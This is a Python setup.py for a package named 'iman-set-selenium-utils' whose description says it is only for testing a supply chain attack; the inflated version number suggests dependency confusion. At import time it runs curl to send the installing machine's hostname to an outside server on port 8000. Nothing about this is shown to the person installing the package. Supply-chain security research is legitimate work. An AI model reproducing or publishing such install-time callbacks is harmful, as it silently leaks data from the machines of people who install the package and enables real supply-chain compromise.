from setuptools import setup, find_packages
import os

hostname = os.uname()[1]
os.system('curl http://jacobsandum.com:8000/imanage-' + hostname)
setup(
    name='iman-set-selenium-utils',
    version='100.1337',
    author='J sandum',
    author_email='sandumjacob@gmail.com',
    description='Do NOT USE, onyl for testing supply chain attack',
    packages=find_packages(),
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
    scripts=[
        'scripts/install_script.py'
    ]
)
